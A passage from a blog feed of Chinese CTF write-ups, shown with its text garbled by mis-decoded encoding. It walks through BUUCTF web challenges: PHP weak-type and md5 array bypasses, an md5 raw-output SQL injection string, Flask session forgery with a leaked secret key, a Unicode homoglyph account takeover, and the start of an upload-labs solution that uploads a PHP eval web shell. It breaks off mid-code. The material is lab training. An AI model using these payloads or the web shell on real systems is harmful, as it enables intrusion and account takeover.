åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå†é€šè¿‡ intval è·å–å˜é‡ key çš„æ•´æ•°å€¼</p>\n<p>æœ€åå¦‚æœå˜é‡ key==â€œ123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3â€ï¼Œè¾“å‡º flag</p>\n<p>ãƒ¾ (ï½¡ï½€Ğ”Â´ï½¡) å¹²å˜›å¹²å˜›å‘¢è¿™æ˜¯ï¼Œæ°”äºº</p>\n<p>áƒš(â•¹â—¡â•¹áƒš) å¥½äº†ï¼Œç™¾åº¦å®Œå›æ¥äº†</p>\n<p>is_numeric ()ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ 16 è¿›åˆ¶ï¼Œç»•è¿‡åˆ¤æ–­ï¼ˆç»å¸¸é€ æˆ sql æ³¨å…¥ï¼‰</p>\n<p>intval ()ï¼Œè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œé»˜è®¤ä¸ºåè¿›åˆ¶</p>\n<p>==ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œå½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œåªæå–å­—ç¬¦ä¸²ä¸­å¼€å¤´çš„æ•´æ•°éƒ¨åˆ†</p>\n<p>â­ç„¶åçªç„¶å‘ç° str æ˜¯ä»¥ 123 å¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒæ˜¯ç­‰äº 123 çš„</p>\n<p>å¥½äº† payloadï¼š?key=123ï¼ŒæˆåŠŸæ‹¿åˆ° flag</p>\n<p>â€¦(ï¼¿ ï¼¿) ãƒï½œå£</p>\n<hr>\n<h2 id=\"hctf-2018-admin1\"><a class=\"markdownIt-Anchor\" href=\"#hctf-2018-admin1\">#</a> HCTF 2018 admin1</h2>\n<p><em>å…³é”®å­—ï¼šflaskï¼Œsession ä¼ªé€ ï¼Œunicode æ¬ºéª—</em></p>\n<p>ğŸ¦‹ç™»å½•å’Œæ³¨å†Œç•Œé¢ï¼Œçœ‹é¢˜ admin</p>\n<p>è¾“å…¥ admin/admin ç™»å½•å¤±è´¥</p>\n<p>æ³¨å†Œ admin/admin è¯¥è´¦æˆ·å·²è¢«æ³¨å†Œ</p>\n<p>ğŸ¦‹çˆ†ç ´â‘§è¡Œï¼Œè¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œæˆ‘è§‰å¾—ç•™ä¸€ä¸ªæ³¨å†Œé¡µé¢åº”è¯¥æ˜¯ç”¨æ¥æ³¨å†Œçš„</p>\n<p>æ³¨å†Œ admin123/admin123ï¼ˆå¼±å£ä»¤è€ç©å®¶Ù©â—”Ì¯â—”Û¶ ï¼‰</p>\n<p>ç™»å½•åå›æ˜¾ï¼ˆæµ‹äº†ä¸€éå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼‰ï¼š</p>\n<p><img src=\"buuctf-web5.png\" style=\"zoom:40%;\" /><img src=\"buuctf-web6.png\" style=\"zoom:40%;\" /></p>\n<img src=\"buuctf-web4.png\" style=\"zoom:22%;\" />\n<p>ğŸ¦‹åœ¨ changepassword ä¸­æœ‰ä¸€è¡Œè¢«æ³¨é‡Šæ‰çš„æç¤ºä¿¡æ¯</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>\n<p>flask æ˜¯ä¸€ä¸ªå¾®å‹çš„ python å¼€å‘çš„ web æ¡†æ¶</p>\n<p>ç„¶åå‘ç°æ˜¯é¢˜ç›®æºç ï¼Œä½†æ˜¯.sql æ–‡ä»¶ä¸­å­˜å‚¨çš„ admin å¯†ç æ˜¯ hash åŠ å¯†è¿‡çš„</p>\n<p>ğŸ€å¯¹ä¸èµ·æˆ‘åªèƒ½æƒ³åˆ°æ„é€  admin çš„ session ç™»å½• session ç”¨æˆ·äº†</p>\n<p><img src=\"buuctf-web7.gif\" alt=\"img\"></p>\n<p>ç»™å½“å‰ç™»å½•ç”¨æˆ·çš„ session è§£å¯†å¦‚ä¸‹ï¼š</p>\n<p><img src=\"buuctf-web7.png\" alt=\"\"></p>\n<p>å¯ä»¥çœ‹åˆ°å½“å‰ç™»å½•ç”¨æˆ·æ˜¯ admin123 è¾£</p>\n<p>index.html ç•Œé¢ä¼šå›æ˜¾ç”¨æˆ·è´¦æˆ·åï¼Œç›®æµ‹æ˜¯æ ¹æ® session ä¸­çš„ name å›æ˜¾çš„ï¼ŒæŸ¥çœ‹æºä»£ç ä¸­çš„ index.html æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% include(<span class=\"string\">&#x27;header.html&#x27;</span>) %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> current_user.is_authenticated %&#125;</span><br><span class=\"line\">&lt;h1 <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">Hello</span> &#123;&#123; <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] &#125;&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">if</span> <span class=\"title\">current_user</span>.<span class=\"title\">is_authenticated</span> <span class=\"title\">and</span> <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] == &#x27;<span class=\"title\">admin</span>&#x27; %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;<span class=\"title\">h1</span> <span class=\"title\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">hctf</span>&#123;<span class=\"title\">xxxxxxxxx</span>&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;!-- <span class=\"title\">you</span> <span class=\"title\">are</span> <span class=\"title\">not</span> <span class=\"title\">admin</span> --&gt;</span></span><br><span class=\"line\"><span class=\"class\">&lt;h1 <span class=\"keyword\">class</span>=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span></span><br></pre></td></tr></table></figure>\n<p xxxxxxxxx=\"\">å½“ session ä¸­çš„ name=admin æ—¶ï¼Œä¼šè¾“å‡º flaghctf</p>\n<p>ä½†æ˜¯ flask session åŠ å¯†éœ€è¦ç§˜é’¥ï¼Œåœ¨ config.py ä¸­æ‰¾åˆ° SECRET_KEY=os.environ.get (â€˜SECRET_KEYâ€™) or â€˜ckj123â€™</p>\n<p><img src=\"buuctf-web11.png\" alt=\"buuctf-web11\"></p>\n<p>åˆ©ç”¨<a href=\"https://github.com/noraj/flask-session-cookie-manager\"> flask_session åŠ è§£å¯†å·¥å…·</a>è¿›è¡Œ session åŠ è§£å¯†</p>\n<p>å°†ä»¥ä¸‹æ•°æ®åŠ å¯†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&#x27;, &#x27;csrf_token&#x27;: b&#x27;62c673754392025e9b7ce0ec4fe937415e76df71&#x27;, &#x27;image&#x27;: b&#x27;wlBG&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"buuctf-web8.png\" alt=\"\"></p>\n<p>æ‹¿åˆ° flagï¼Œå¥½è€¶ãƒ¾ (âœ¿ï¾Ÿâ–½ï¾Ÿ) ãƒ</p>\n<p>ğŸ€å†æ¥æ’¸ä¸€ä¸‹<a href=\"http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\"> unicode åŒå½¢å­—å¼•èµ·çš„å®‰å…¨é—®é¢˜</a></p>\n<p>åœ¨è¿™é‡Œ <code>Twistedåº“çš„ç‰ˆæœ¬æ˜¯10.0.0</code></p>\n<p>nodeprep.prepare () å‡½æ•°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ï¼šä¼šæŠŠå…¶ä»–ç±»çš„ç¼–ç è½¬ä¸º ascii ç ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨ï¼šå†…å®¹è½¬ä¸ºå°å†™</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">á´¬á´°á´¹á´µá´º â€”&gt; ADMIN â€”&gt; admin</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--rutes-ck2hx70mgflissmgc.py\">æŸ¥çœ‹æºä»£ç  rutes.py</a>ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªè½¬å°å†™å‡½æ•°ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">strlower</span>(<span class=\"params\">username</span>):</span>    username = nodeprep.prepare(username)    <span class=\"keyword\">return</span> username</span><br></pre></td></tr></table></figure>\n<p>åœ¨ä¸‰ä¸ªåŠŸèƒ½ç‚¹å¤„éƒ½è°ƒç”¨è¿‡ä¸€æ¬¡è¯¥å‡½æ•°ï¼šregisterã€loginã€change</p>\n<p>åœ¨ç™»å½•æ—¶ï¼Œä¼šè°ƒç”¨ strlower ()ï¼Œå°†á´¬á´°á´¹á´µá´º è½¬æˆ ADMINï¼Œå­˜å‚¨åœ¨ session ä¸­</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class=\"string\">&#x27;name&#x27;</span>] = name</span><br></pre></td></tr></table></figure>\n<p>å› æ­¤ï¼Œæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦æˆ·åä¸ºá´¬á´°á´¹á´µá´ºçš„ç”¨æˆ·ï¼Œç™»å½•åæ¬¢è¿ç•Œé¢ä¼šæ˜¾ç¤º ADMIN</p>\n<img src=\"buuctf-web9.png\" style=\"zoom:50%;\" />\n<p>ä¿®æ”¹å¯†ç æ—¶ï¼ŒåŒæ ·ä¼šå†æ¬¡è°ƒç”¨ strlower ()ï¼Œå°† ADMIN è½¬æˆ adminï¼Œå­˜å‚¨åœ¨ session ä¸­</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:        name = strlower(session[<span class=\"string\">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class=\"string\">&#x27;change successful&#x27;</span>)        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>\n<p>å› æ­¤æ­¤æ—¶æˆ‘ä»¬ä¿®æ”¹çš„å¯†ç ä¸º admin çš„å¯†ç </p>\n<p>ç„¶ååš¯åš¯åš¯æ‹¿åˆ° flag ãƒ¾ (ï½¥Ï‰ï½¥`ï½¡)</p>\n<p>ğŸ€å¤§å¤±è´¥</p>\n<p>å› ä¸ºç™»å½•æ—¶ï¼Œæ˜¯å…ˆå†™å…¥ sessionï¼Œå†åˆ¤æ–­è¯¥è´¦æˆ·æ˜¯å¦ç™»å½•æˆåŠŸ</p>\n<p>æ”¹å¯†ç æ—¶ï¼Œéœ€è¦è·å– sessionï¼Œå†è¿›è¡Œå¯†ç ä¿®æ”¹</p>\n<p>å› æ­¤åœ¨ç™»å½•å†™å…¥ session ä¹‹åï¼Œåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•æˆåŠŸé”€æ¯ session ä¹‹å‰ï¼Œæ­¤æ—¶ä¿®æ”¹å¯†ç ï¼Œå°±å¯ä»¥æˆåŠŸä¿®æ”¹ç™»å½•ç”¨æˆ·çš„å¯†ç </p>\n<p>ä½†æ˜¯æˆ‘æ²¡æœ‰çœ‹è§ login å¤„ç™»å½•å¤±è´¥æ—¶ï¼Œä¼šé”€æ¯ session</p>\n<p>ğŸ´æ‰€ä»¥å…ˆåœ¨ç«ç‹ä¸Šç™»å½•ä¸€ä¸ªéšä¾¿æ³¨å†Œçš„è´¦å·ï¼Œæ‰“å¼€æ›´æ”¹å¯†ç ç•Œé¢</p>\n<p>ğŸ´å†åœ¨è°·æ­Œä¸Šç™»å½• admin è´¦å·ï¼ˆéšä¾¿è¾“å…¥å¯†ç ï¼‰</p>\n<p>ğŸ´æœ€åä¿®æ”¹å¯†ç </p>\n<p>ç”¨ä¿®æ”¹çš„å¯†ç ç™»å½• admin è´¦å·å¤±è´¥</p>\n<p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p>\n<p><a href=\"https://blog.csdn.net/weixin_44677409/article/details/100733581\">æ­¤é¢˜ä¸‰ç§è§£æ³•</a></p>\n<p><a href=\"https://www.jianshu.com/p/278d4f59839d\">flask session</a></p>\n<p><a href=\"https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin\">Unicode å°éª—å­</a></p>\n<p>php å¼±ç±»å‹æ¯”è¾ƒè¡¨</p>\n<p><img src=\"buuctf-web10.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-buyflag\"><a class=\"markdownIt-Anchor\" href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-buyflag\">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 BuyFlag</h2>\n<p><em>å…³é”®è¯ï¼šphpã€strcmp () ç»•è¿‡</em></p>\n<p>ğŸ€æŸ¥çœ‹ pay.php æºç ï¼Œå‘ç°æç¤º</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~~~post money <span class=\"keyword\">and</span> password~~~<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_numeric(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;\t\t\t&#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;\t</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>password å¼±æ¯”è¾ƒï¼Œpassword=404a</p>\n<p>ğŸ€æ ¹æ® Flag need your 100000000 moneyï¼Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³• 1e9ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<a href=\"https://blog.csdn.net/cherrie007/article/details/77473817\"> strcmp æ¼æ´</a>ï¼Œè¿›è¡Œç»•è¿‡</p>\n<p>money []=a æˆ–è€… money=1e9 éƒ½å¯ä»¥</p>\n<p>ğŸ€æ ¹æ® You must be a student from CUITï¼Œå¤§æ¦‚ç‡æ˜¯åœ¨ cookie å¤„éªŒè¯èº«ä»½ä¿¡æ¯</p>\n<p>å‘ç° cookie å¤„æœ‰ä¸€ä¸ª user=0ï¼Œæ”¹æˆ user=1 å³å¯é€šè¿‡éªŒè¯</p>\n<hr>\n<h2 id=\"bjdctf2020-easy-md5\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf2020-easy-md5\">#</a> BJDCTF2020 Easy MD5</h2>\n<p><em>å…³é”®è¯ï¼šphpã€md5 () ç»•è¿‡</em></p>\n<p>æŠ“åŒ…çœ‹è§å“åº”åŒ…ä¸­çš„æç¤º</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>çœ‹é¢˜å¦‚æœæ­£å¸¸ md5 åŠ å¯† pass è¿™ä¸ªé€»è¾‘ï¼Œè‚¯å®šæ³¨ä¸è¿›å»å“‡</p>\n<p>è¾£å°±å»æ‰¾å…³äº md5 () è¿™ä¸ªå‡½æ•°çš„æ¼æ´</p>\n<blockquote>\n<p>è¯­æ³•ï¼šmd5 (string,raw)</p>\n<p><strong>string</strong>: æ‰€éœ€åŠ å¯†çš„å­—ç¬¦ä¸²</p>\n<p><strong>raw</strong>: å¯é€‰å‚æ•° TRUE æˆ– FALSEã€‚FALSEï¼ˆé»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ï¼‰ï¼›TRUEï¼ˆåŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼‰</p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯è¯´å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º true æ—¶ï¼Œè¿”å›çš„æ˜¯åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼çš„æ•£åˆ—å€¼ï¼Œä¼šè¢«å½“åš ascii ç å­—ç¬¦ä¸²å¤„ç†ï¼ˆï¼Ÿï¼‰</p>\n<p>â­åŸå§‹äºŒè¿›åˆ¶æ•°æ®æŒ‡åŸå§‹å­—ç¬¦ä¸²è½¬æ¢æˆ ascii ç åç»„æˆçš„å­—ç¬¦ä¸²</p>\n<p>æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ª strï¼Œç»è¿‡ md5 (str, true) åŠ å¯†åï¼Œå†è½¬æˆ ascii ç å­—ç¬¦ä¸²ï¼ŒåŒ…å«æˆ‘ä»¬éœ€è¦æ³¨å…¥çš„å­—ç¬¦å³å¯</p>\n<p>çœ‹ sql è¯­å¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>å°† where åçš„æ¡ä»¶æ’ä¸ºçœŸæ—¶ï¼Œæˆ‘ä»¬å°±å¯è·å– admin è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®</p>\n<p>ğŸ´èƒ½ç”¨çš„å­—ç¬¦ä¸²</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8string: T0Do#&#x27;or&#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>å½“ä¸”ä»…å½“ or åå­—ç¬¦ä¸²å¼€å¤´å­—ç¬¦ä¸º 0 æ—¶ï¼Œè¿”å› false</p>\n<p>è¾“å…¥ payloadï¼Œè·³è½¬è‡³ levels91.phpï¼Œæºç ä¸­åŒ…å«æç¤ºï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];<span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];<span class=\"keyword\">if</span>(<span class=\"variable\">$a</span> != <span class=\"variable\">$b</span> &amp;&amp; md5(<span class=\"variable\">$a</span>) == md5(<span class=\"variable\">$b</span>))&#123;    <span class=\"comment\">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>\n<p>å½“å­—ç¬¦ä¸² aï¼Œb ä¸ç›¸ç­‰ï¼Œmd5 åŠ å¯†åçš„å­—ç¬¦ä¸²ç›¸ç­‰åï¼Œè¿›å…¥ if ä¸­æ²¡æœ‰æ”¾å‡ºæ¥çš„ä»£ç </p>\n<p>â­5ï¸âƒ£â‘§è¨¾ Dao ã® 4ï¼šmd5 () æˆ–è€… sha1 () ä¹‹ç±»çš„å‡½æ•°è®¡ç®—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºæ•°ç»„åˆ™è¿”å› falseï¼Œå¦‚æœ<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>å’Œ</mtext></mrow><annotation encoding=\"application/x-tex\">aå’Œ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">å’Œ</span></span></span></span> b éƒ½æ˜¯æ•°ç»„åˆ™åŒåŒè¿”å› FALSE, ä¸¤ä¸ª FALSE ç›¸ç­‰å¾—ä»¥ç»•è¿‡</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a[]=111&amp;b[]=www</span><br></pre></td></tr></table></figure>\n<p>è·³è½¬è‡³ levell14.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>error_reporting(<span class=\"number\">0</span>);<span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;highlight_file(<span class=\"keyword\">__FILE__</span>);<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>]!==<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>])===md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]))&#123;    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;&#125; </span><br></pre></td></tr></table></figure>\n<p>payload (POST è¯·æ±‚):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>\n<p>ä¸€æ ·ã® zsd</p>\n<p><strong>å‚è€ƒé“¾æ¥</strong></p>\n<p><a href=\"https://blog.csdn.net/iczfy585/article/details/106081299\">PHP ä¸­ md5 å¸¸è§ç»•è¿‡</a></p>\n<p><a href=\"https://www.w3school.com.cn/php/func_string_md5.asp\">PHP_md5 å‡½æ•°</a></p>\n<p><a href=\"https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/\">æ¢ç©¶ php çš„ MD5 å‡½æ•°è¾“å‡ºçš„åŸå§‹äºŒè¿›åˆ¶æ•°æ®æ˜¯å•¥ï¼Ÿ</a></p>\n<p><a href=\"https://www.cnblogs.com/wangtanzhi/p/12304899.html\">å“’æš—</a></p>\n<hr>\n<p>æœªå®Œå¾…ç»­â€¦</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "upload-labsåŸºç¡€å…³å¡",
            "date_published": "2020-11-25T13:24:52.000Z",
            "content_html": "<h1 id=\"pass-01\"><a class=\"markdownIt-Anchor\" href=\"#pass-01\">#</a> Pass-01</h1>\n<h2 id=\"è¿‡ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹\">#</a> è¿‡ç¨‹</h2>\n<p>ç¬¬ä¸€å…³ï¼Œé€šå¸¸éšä¾¿ä¼ æŠŠå“ˆå“ˆå“ˆ</p>\n<p>æ¥ä¸ª php ä¸€å¥è¯</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hqxx&#x27;</span>]);    </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å“¦è±ï¼Œå¼¹çª—æç¤ºäº†ï¼šè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gif ç±»å‹çš„æ–‡ä»¶ï¼Œå½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php</p>\n<p>å¼¹çª—æç¤ºï¼Œæ²¡æœ‰å‘è¯·æ±‚åŒ…ï¼Œè¯´æ˜æ˜¯å‰ç«¯éªŒè¯äº†ï¼Œé‚£å°±å»æ‰¾ js éªŒè¯ä»£ç ï¼Œå¹²æ‰ä»–</p>\n<p><img src=\"upload-labs-01-01.png\" alt=\"\"></p>\n<p>æ–¹æ³• 1ï¼šCtrl+F æ‰¾å“ªä¸ªæ ‡ç­¾ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œåˆ æ‰å®ƒï¼Œç„¶åç‚¹å‡»ä¸Šä¼ </p>\n<p><img src=\"upload-labs-01-02.png\" alt=\"\"></p>\n<p>æ–¹æ³• 2ï¼šå¤åˆ¶ checkFile å‡½æ•°ï¼Œå°†.php ç±»å‹åŠ è¿›ç™½åå•ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥è¿è¡Œåç‚¹å‡»ä¸Šä¼ </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkFile() &#123;</span><br><span class=\"line\">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class=\"line\">    var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br><span class=\"line\">    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class=\"line\">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">    //åˆ¤æ–­ä¸Šä¼ 